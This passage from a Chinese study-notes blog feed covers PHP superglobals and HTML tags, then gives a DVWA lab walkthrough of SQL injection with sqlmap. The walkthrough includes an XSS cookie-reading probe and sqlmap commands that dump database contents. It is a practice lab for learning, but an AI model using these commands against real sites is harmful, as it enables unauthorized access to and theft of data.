class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>echo</th><th>支持用”.”（点）和”,”（逗号）分隔多个字符进行拼接输出。</th></tr></thead><tbody><tr><td><strong>print</strong></td><td><strong>不支持用”,”（逗号）分隔多个字符进行拼接输出，只能用”.”（点）进行拼接。</strong></td></tr></tbody></table><p><strong>换行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="四、变量"><a href="#四、变量" class="headerlink" title="四、变量"></a>四、变量</h3><p>用于存储信息的容器</p><h4 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h4><p>即值可以变化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span>=<span class="number">5</span>;  <span class="comment">//声明变量并赋值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h4><p>在全部作用域中始终可用的内置变量（此处简单了解即可，后续使用中学习具体用法）。</p><ul><li><p><strong>$_GET</strong></p><p>获取前端表单通过 GET 方法传递过来的值。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$get </span>= <span class="variable">$_GET</span>[<span class="string">&quot;username&quot;</span>];    <span class="comment">// 获取前端通过 get 方法提交的表单中 name=username 传递过来的值    </span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>$_POST</strong></li></ul><p>​获取前端表单通过POST方法传递过来的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$post </span>= <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];    <span class="comment">// 获取前端通过 post 方法提交的表单中 name=username 传递过来的值  </span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>$_REQUEST</strong></li></ul><p>​既能得到 GET 的传值结果，也能得到 POST 的传值结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"><span class="variable">$request</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>];    <span class="comment">// 获取前端通过 get 或 post 方法提交的表单中 name=username 传递过来的值  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>$_COOKIE</strong></li></ul><p>​获取会话控制中 cookie 的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;username&quot;</span>];    <span class="comment">// 获取 cookie 中 username 的值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>$_SESSION</strong></li></ul><p>​获取会话控制中 session 的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$session</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];    <span class="comment">// 获取 session 中 username 的值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>$_SERVER</strong></li></ul><p>​获取关于请求方法、IP 地址、路径和运行脚本的根目录等信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$server</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOVE_ADDR&quot;</span>];    <span class="comment">// 获取浏览当前页面的用户 IP 地址</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="五、数据类型"><a href="#五、数据类型" class="headerlink" title="五、数据类型"></a>五、数据类型</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML速成</title>
      <link href="/2024/10/14/HTML%E9%80%9F%E6%88%90/"/>
      <url>/2024/10/14/HTML%E9%80%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>渐渐的要把之前落下的东西补一补了，毕竟要随时为跳槽做个准备把。说实话，感觉转正概率不太大，现在也是比较清闲的一个带薪混日子状态，但毕业后我肯定还是想去找个钱多的工作，转正当然好，不能转正到时候凭着项目经历大概也好找工作一些（虽然错过秋招）。好了，打铁还需自身硬，修炼好技术再说。</p></blockquote><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote><p>说实话虽然很久没用了，但对大部分语法啊什么的还留有一些印象，简单的复习一下基础的东西吧~</p></blockquote><p>首当其冲的就是标签啦~</p><p>虽然说有时候会想不起来，但是大部分<strong>常用</strong>的已经*in my DNA了，看到他就像看到“abandon”一样（一眼丁真）</p><table><thead><tr><th align="left">标签</th><th>描述</th><th>单双？</th></tr></thead><tbody><tr><td align="left">&lt;!DOCTYPE&gt;</td><td>定义文档类型。</td><td>~</td></tr><tr><td align="left">html</td><td>定义 HTML 文档的根。</td><td>双</td></tr><tr><td align="left">head</td><td>定义关于文档的信息。</td><td>双</td></tr><tr><td align="left">title</td><td>定义文档的标题。</td><td>双</td></tr><tr><td align="left">body</td><td>定义文档的主体。</td><td>双</td></tr><tr><td align="left">h1</td><td>定义 HTML 标题。</td><td>双</td></tr><tr><td align="left">p</td><td>定义段落。</td><td>双</td></tr><tr><td align="left">br</td><td>换行</td><td>单</td></tr><tr><td align="left">hr</td><td>分割线</td><td>单</td></tr></tbody></table><p>好啦，这只是开胃菜，下面出场的是让你感到陌生又熟悉的<strong>格式化</strong>标签（说到陌生又熟悉，我就想到该死的四级作文canteen）</p><table><thead><tr><th align="left">标签</th><th>描述</th><th>单双？</th></tr></thead><tbody><tr><td align="left">abbr</td><td>定义缩写词或首字母缩略词。</td><td>双</td></tr><tr><td align="left">address</td><td>定义文档作者或拥有者的联系信息。</td><td>双</td></tr><tr><td align="left">b</td><td>定义粗体文本。</td><td>双</td></tr><tr><td align="left">small</td><td>定义小号文本</td><td>双</td></tr><tr><td align="left">bdi</td><td>标签隔离了一部分文本，这部分文本可能在方向上与外部其他文本不同。</td><td>双</td></tr><tr><td align="left">bdo</td><td>定义文字方向。</td><td>双</td></tr><tr><td align="left">blockquote</td><td>定义长的引用。</td><td>双</td></tr><tr><td align="left">q</td><td>定义短的引用</td><td>双</td></tr><tr><td align="left">cite</td><td>定义作品的标题</td><td>双</td></tr><tr><td align="left">code</td><td>定义一段计算机代码</td><td>双</td></tr><tr><td align="left">samp</td><td>定义计算机程序的样本输出</td><td>双</td></tr><tr><td align="left">del</td><td>删除线</td><td>双</td></tr><tr><td align="left">s</td><td>定义不再正确的文本（删除线）</td><td>双</td></tr><tr><td align="left">dfn</td><td>规定要在内容中定义的术语(斜体)</td><td>双</td></tr><tr><td align="left">em</td><td>定义强调文本</td><td>双</td></tr><tr><td align="left">i</td><td>定义以不同的语气或情态表达的文本部分</td><td>双</td></tr><tr><td align="left">ins</td><td>定义已插入到文档中的文本</td><td>双</td></tr><tr><td align="left">kbd</td><td>定义键盘输入</td><td>双</td></tr><tr><td align="left">mark</td><td>定义应标记或突出显示的文本</td><td>双</td></tr><tr><td align="left">meter</td><td>定义已知范围内的仪表</td><td>双</td></tr><tr><td align="left">progress</td><td>定义任务进度</td><td>双</td></tr><tr><td align="left">pre</td><td>定义预格式文本</td><td>双</td></tr><tr><td align="left">strong</td><td>定义重要的文本</td><td>双</td></tr><tr><td align="left">sup</td><td>定义上标文本</td><td>双</td></tr><tr><td align="left">sub</td><td>定义下标文本</td><td>双</td></tr><tr><td align="left">template</td><td>定义用作容纳页面加载时隐藏内容的容器</td><td>双</td></tr><tr><td align="left">time</td><td>定义时间</td><td>双</td></tr><tr><td align="left">u</td><td>定义未明确表达且样式与普通文本不同的文本</td><td>双</td></tr><tr><td align="left">var</td><td>定义变量</td><td>双</td></tr><tr><td align="left">wbr</td><td>定义可能的换行符</td><td>单</td></tr></tbody></table><p>我知道你肯定有不少都不记得了吧（因为我也是），所以下面，让我来展示几个实例熟悉一下：</p><p>1、<strong>abbr</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;World Health Organization&quot;</span>&gt;</span>WHO<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span> 成立于 1948 年。</span><br></pre></td></tr></table></figure><p>2、<strong>code</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>code 元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>HTML <span class="tag">&lt;<span class="name">code</span>&gt;</span>button<span class="tag">&lt;/<span class="name">code</span>&gt;</span> 标签定义可点击按钮。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>CSS <span class="tag">&lt;<span class="name">code</span>&gt;</span>background-color<span class="tag">&lt;/<span class="name">code</span>&gt;</span> 属性定义元素的背景色。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/code.jpg" alt="image"></p><p>3、<strong>samp</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>samp 元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>来自我的电脑的消息：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">samp</span>&gt;</span>文件未找到。<span class="tag">&lt;<span class="name">br</span>&gt;</span>按 F1 继续<span class="tag">&lt;/<span class="name">samp</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/samp.jpg" alt="image"></p><p>4、<strong>template</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>template 元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>单击下面的按钮可显示 template 元素中隐藏的内容。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;showContent()&quot;</span>&gt;</span>显示隐藏的内容<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>郁金香<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/i/photo/tulip.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">showContent</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> temp = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;template&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> clon = temp.<span class="property">content</span>.<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(clon);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/template.jpg" alt="image"></p><hr><p>其他的大约也是差不多的效果，这里仅展示了一些比较陌生的元素，继续吧！</p><p>接下来出场的是<strong>表单和输入</strong>的标签，也算是比较熟悉了~</p><table><thead><tr><th>标签</th><th>描述</th><th>单双</th></tr></thead><tbody><tr><td>form</td><td>定义供用户输入的HTML表单</td><td></td></tr><tr><td>input</td><td>定义输入框</td><td></td></tr><tr><td>textarea</td><td>多行文本的文本框</td><td></td></tr><tr><td>button</td><td>可点击的按钮</td><td></td></tr><tr><td>select</td><td>下拉列表</td><td></td></tr><tr><td>optgroup</td><td>下拉列表中相关选项的分组</td><td></td></tr><tr><td>option</td><td>下拉列表的选项</td><td></td></tr><tr><td>label</td><td>input元素的标注</td><td></td></tr><tr><td>fieldset</td><td>对表单相关元素进行分组</td><td></td></tr><tr><td>legend</td><td>定义fieldset元素的标题</td><td></td></tr><tr><td>datalist</td><td>规定输入控件的预定义选项刘表</td><td></td></tr><tr><td>output</td><td>定义计算的结果</td><td></td></tr></tbody></table><p>还是稍微试一段代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;textarea&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;这是一个文本框&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;这只是一个按钮&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;下拉列表&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;这是第一个选项组&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>选项1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>选项2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;这是第二个选项组&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>选项3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>选项4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">legend</span>&gt;</span>这是个fieldset<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;这是一个文本框&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">&quot;mylist&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;apple&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;banana&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;我已阅读并了解相关条款&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>我已阅读并了解相关条款<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">output</span> <span class="attr">name</span>=<span class="string">&quot;输出框&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/img/1.jpg" alt="image"></p><p><img src="/img/1.1.jpg" alt="image"></p><hr><p>下一个，下一个。<strong>上图像</strong></p><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">img</td><td align="left">定义图像。</td></tr><tr><td align="left">map</td><td align="left">定义图像映射。</td></tr><tr><td align="left">area</td><td align="left">定义图像地图内部的区域。</td></tr><tr><td align="left">canvas</td><td align="left">用于通过脚本（通常是 JavaScript）动态绘制图形。</td></tr><tr><td align="left">figcaption</td><td align="left">定义 figure 元素 的标题。</td></tr><tr><td align="left">figure</td><td align="left">规定自包含的内容。</td></tr><tr><td align="left">picture</td><td align="left">定义多个图像资源的容器。</td></tr><tr><td align="left">svg</td><td align="left">定义 SVG 图形的容器。</td></tr></tbody></table><blockquote><p>确实，从表面上看，使用 <code>&lt;area&gt;</code> 标签与使用多个 <code>&lt;a&gt;</code> 标签包裹同一张图片（<code>&lt;img&gt;</code>）来实现多个链接的功能有相似之处，但它们在实现方式和应用场景上存在一些区别：</p><p><strong>使用 <code>&lt;area&gt;</code> 标签的优点</strong></p><ol><li><strong>不规则形状</strong>：<code>&lt;area&gt;</code> 标签允许你定义不规则形状的可点击区域（如圆形、矩形、多边形），这让你可以使链接与图像内容更加紧密地结合。例如，在一张地图上，某些区域的形状可能并不规则，使用 <code>&lt;area&gt;</code> 可以更好地实现这一点。</li><li><strong>提高可访问性</strong>：当你使用 <code>&lt;map&gt;</code> 和 <code>&lt;area&gt;</code> 的组合时，替代文本（<code>alt</code> 属性）可以分别为每个区域单独提供，这有助于屏幕阅读器用户更好地理解图像的内容和功能。</li><li><strong>只需一张图片</strong>：使用图像地图的方式只需要一张图片，所有的链接都可以通过该图片的不同区域来实现，这样可以减少 DOM 元素数量，从而简化 HTML 结构。</li><li><strong>CSS 和 JavaScript 支持</strong>：虽然你同样可以为多个 <code>&lt;a&gt;</code> 标签添加样式和交互，但使用图像地图的方式可以更灵活地结合 CSS 和 JavaScript，以实现更复杂的布局和效果。</li></ol><p><strong>使用多个 <code>&lt;a&gt;</code> 标签的优点</strong></p><ol><li><strong>简单直观</strong>：对于简单的页面结构，如果每个要链接的区域明确且形状不复杂，使用多个 <code>&lt;a&gt;</code> 标签可能会更简单直接。</li><li><strong>更灵活的样式和功能</strong>：使用多个 <code>&lt;a&gt;</code> 标签可以分别为每个链接设置不同的样式、事件处理和交互效果，更加灵活。</li></ol><p><strong>总结</strong></p><ul><li>如果你需要在同一张图片上创建多个不同形状的链接区域，<code>&lt;area&gt;</code> 和 <code>&lt;map&gt;</code> 是更合适的选择。</li><li>如果你只需要几个简单的链接，并且不涉及复杂的形状，使用 <code>&lt;a&gt;</code> 标签可能更简单明了。</li></ul></blockquote><hr><p><strong>链接</strong></p><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>a</td><td>定义超链接。</td></tr><tr><td>link</td><td>定义文档与外部资源的关系（最常用于链接样式表）。</td></tr><tr><td>nav</td><td>定义导航链接。</td></tr></tbody></table><hr><p>  暂时先更新这么多，HTML后边的有机会还会更新。毕竟，这玩意一般就算要写也是现查，现在有ai更是没必要了解那么深。</p><p>  最近忙了两天，一下又闲下来了，又在网上看了一些招聘的信息，准备重新学点云计算、逆向啥的（当然，得等我吧内容梳理复习好之后，预计11月中旬或者月底才会开启这个新篇章），但是我现在状态就是说啥都懂一点，真刀真枪上场的话还是稍微有点虚的。感觉比较迷茫吧，毕竟上班这么久以来也没让我参与什么有价值的项目，现在像是售前之类的，还是挺沮丧的。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL自动化注入</title>
      <link href="/2024/10/14/SQL%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/10/14/SQL%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>有时候上太多网真不好，今天上微博看到王诗龄快把一辈子福享完了，归来才15岁，天都快塌了。<br>果然人生最大的分水岭是羊水。<br>也不知道怎么滴，博客老是整些幺蛾子，我现在创建博客都要经历一些莫名其妙的错误，通常重启一下就能解决，但是麻烦得很！难道是没梯子的原因吗？不理解！</p></blockquote><blockquote><p>这篇是我在复习中突然发现的，之前说起SQL注入，一般我都是练习手动注入，很少用工具（因为挺方便），结果到头来都忘记怎么使用sqlmap了，真是可怕，现在就来用实战复习一下sqlmap的自动化注入把！</p></blockquote><hr><blockquote><p>靶场：DVWA</p><p>工具：kali2023</p></blockquote><ul><li><h3 id="低级别（get）："><a href="#低级别（get）：" class="headerlink" title="低级别（get）："></a>低级别（get）：</h3><img src="/SQLpic/1.jpg" alt="image"></li></ul><p>首先，在输入框随便输入内容，提交后复制<strong>url</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.129/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>然后，在xss（反射型）中拿到<strong>cookie</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/SQLpic/2.jpg" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security=low; PHPSESSID=kf4024a29bqurpaf99qi0ocuu5</span><br></pre></td></tr></table></figure><p>之后就打开你的kali（记得更新sqlmap哦~）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --cookie &#x27;cookie&#x27; --dbs</span><br><span class="line">sqlmap -u &quot;url&quot; --cookie &#x27;cookie&#x27; -D 数据库名 -T 表名 -C 列名 --dump</span><br></pre></td></tr></table></figure><p>反正就记住一点，<strong>查东西就是–，指定就是-</strong></p><p>查数据库就是–dbs,查表名就是–tables,依次类推</p><p>下面展示结果：</p><p>数据库名：</p><p><img src="/SQLpic/database.jpg" alt="image"></p><p>表名：</p><p><img src="/SQLpic/table.jpg" alt="image"></p><p>字段名：</p><p><img src="/SQLpic/column.jpg" alt="image"></p><p>字段内容：</p><p><img src="/SQLpic/dump.jpg" alt="image"></p><ul><li><h3 id="中级别（post）"><a href="#中级别（post）" class="headerlink" title="中级别（post）"></a>中级别（post）</h3></li></ul><blockquote><p>中级别跟低级别的最主要的区别就是一个是get提交参数，一个是post提交参数。</p><p>在手工注入中，我们采取抓包改包的方式完成注入。（另外，它对单引号进行了过滤，一个方法是对表名user进行16进制编码绕过）</p></blockquote><p>还是先进行准备工作：</p><p>新建一个&#x2F;root&#x2F;post.txt，把正常 POST 包的内容复制进去，再调用文档来进行注入</p><p><img src="/SQLpic/3.jpg" alt="image"></p><p>运行命令得到数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r /root/post.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="/SQLpic/database2.jpg" alt="image"></p><p>剩下的与前文大同小异，此处不再赘述</p><h3 id="高级别"><a href="#高级别" class="headerlink" 